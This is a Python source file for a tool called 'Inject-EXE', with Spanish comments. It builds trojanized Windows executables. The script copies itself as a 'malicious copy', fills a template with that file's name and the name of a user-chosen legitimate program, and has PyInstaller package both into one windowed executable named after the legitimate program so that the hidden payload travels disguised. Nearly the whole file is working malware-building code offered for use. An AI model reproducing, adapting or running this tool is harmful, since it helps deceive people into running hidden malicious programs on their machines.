import os
import PyInstaller.__main__
import shutil
import sys
import uuid
import ctypes

def auto_copy_self():
    current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    filename = f"copy_{uuid.uuid4().hex[:8]}.exe"
    destination = os.path.join(os.getcwd(), filename)
    if "copy_" in os.path.basename(current_path):
        return current_path
    try:
        shutil.copy2(current_path, destination)
        print(f"[+] Se creó una copia en: {destination}")
        return destination
    except Exception as e:
        print(f"[!] Error al crear la copia: {e}")
        return None

def get_script_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

def main():
    
    # Definir el Python 32-bit que ejecutará PyInstaller
    python32_path = r"C:\python32\python.exe"  # Ajusta esta ruta según tu entorno
    # Evitar ejecución recursiva si ya es copia
    current_name = os.path.basename(sys.executable if getattr(sys, 'frozen', False) else __file__)
    print(f"[DEBUG] current executable: {current_name}")
    if current_name.startswith("copy_") and current_name.endswith(".exe"):
        ctypes.windll.user32.MessageBoxW(0, "Copia barata!", "Copia", 0x40 | 0x1)
        print("[*] Ejecutándose desde la copia, terminando para evitar recursión.")
        return
    ctypes.windll.user32.MessageBoxW(0, "damian de cristal.", "Inject-EXE", 0x40 | 0x1)
    
    script_dir = get_script_dir()

    print("\033[38;2;255;69;172m" + r'''
    ____        _           __        _______  __ ______
   /  _/___    (_)__  _____/ /_      / ____/ |/ // ____/
   / // __ \  / / _ \/ ___/ __/_____/ __/  |   // __/   
 _/ // / / / / /  __/ /__/ /_/_____/ /___ /   |/ /___   
/___/_/ /_/_/ /\___/\___/\__/     /_____//_/|_/_____/   
         /___/                                          
                                      By @malwarekid
''' + "\033[0m")

    legit_exe = input("Enter your \033[32mlegit\033[0m executable: ").strip()

    mal_copy_path = auto_copy_self()
    # Agrega esto antes de armar los argumentos de PyInstaller
    mal_basename = os.path.basename(mal_copy_path)
    legit_basename = os.path.basename(legit_exe)

    # Lee la plantilla
    template_path = os.path.join(script_dir, "include", "extra_template.py")
    with open(template_path, "r", encoding="utf-8") as f:
        template_code = f.read()

    # Reemplaza los marcadores
    #custom_code = template_code.replace("__MAL_FILENAME__", repr(mal_basename))
    
    #custom_code = custom_code.replace("__LEGIT_FILENAME__", repr(legit_basename))
    import json

    custom_code = template_code.replace("__MAL_FILENAME__", json.dumps(mal_basename))
    custom_code = custom_code.replace("__LEGIT_FILENAME__", json.dumps(legit_basename))
    # Guarda el archivo final
    custom_extra_path = os.path.join(script_dir, "include", "extra.py")
    with open(custom_extra_path, "w", encoding="utf-8") as f:
        f.write(custom_code)
        #print("Mal path:", mal_file)
        #print("Legit path:", legit_file)
    if not mal_copy_path:
        print("[!] No se pudo crear la copia maliciosa.")
        return

    legit_exe_name = os.path.splitext(os.path.basename(legit_exe))[0] + "-output"

    dist_path = os.path.join(script_dir, "dist")
    os.makedirs(dist_path, exist_ok=True)

    pyinstaller_args = [
        '--onefile',
        '--windowed',
        '--noconfirm',
        '--clean',
        f'--add-data={mal_copy_path};.',
        f'--add-data={legit_exe};.',
        f'--distpath={dist_path}',
        f'--name={legit_exe_name}',
        os.path.join(script_dir, "include", "extra.py"),  # Usa el script plantilla directo
    ]

    # Solo agregar ícono si es un archivo .ico válido
    if legit_exe.lower().endswith(".ico"):
        pyinstaller_args.append(f'--icon={legit_exe}')
    else:
        print("[!] No se usará ícono (el archivo no es .ico válido).")

        print(f"[+] Compilando con PyInstaller como: {legit_exe_name}.exe")

    #PyInstaller.__main__.run(pyinstaller_args)
    import subprocess
    
    print("\n[+] Ejecutando PyInstaller...\n")

    command = [python32_path, '-m', 'PyInstaller'] + pyinstaller_args
    print("[DEBUG] Comando:", ' '.join(command))

    try:
        result = subprocess.run(command, cwd=script_dir, capture_output=True, text=True)
        print("\n[PyInstaller STDOUT]:\n", result.stdout)
        print("\n[PyInstaller STDERR]:\n", result.stderr)
    except Exception as e:
        print(f"[!] Error ejecutando PyInstaller: {e}")
        return
    #result = subprocess.run(
    #    [python32_path, '-m', 'PyInstaller'] + pyinstaller_args,
    #    cwd=script_dir,
    #    capture_output=True,
    #    text=True
    #)

    print("[PyInstaller STDOUT]:\n", result.stdout)
    print("[PyInstaller STDERR]:\n", result.stderr)
    output_path = os.path.join(dist_path, f"{legit_exe_name}.exe")

    if os.path.exists(output_path):
        print(f"[+] Confirmado: archivo generado en → {output_path}")
    else:
        print(f"[!] No se encontró el ejecutable en la ruta esperada: {output_path}")

    # Opcional: limpiar build y spec
    spec_file = os.path.join(script_dir, f'{legit_exe_name}.spec')
    if os.path.exists(spec_file):
        os.remove(spec_file)

    build_dir = os.path.join(script_dir, 'build')
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)

    print(f"\033[32m[ok] Inject-EXE generado:\033[0m \033[31m{legit_exe_name}.exe\033[0m\n")

if __name__ == "__main__":
    main()
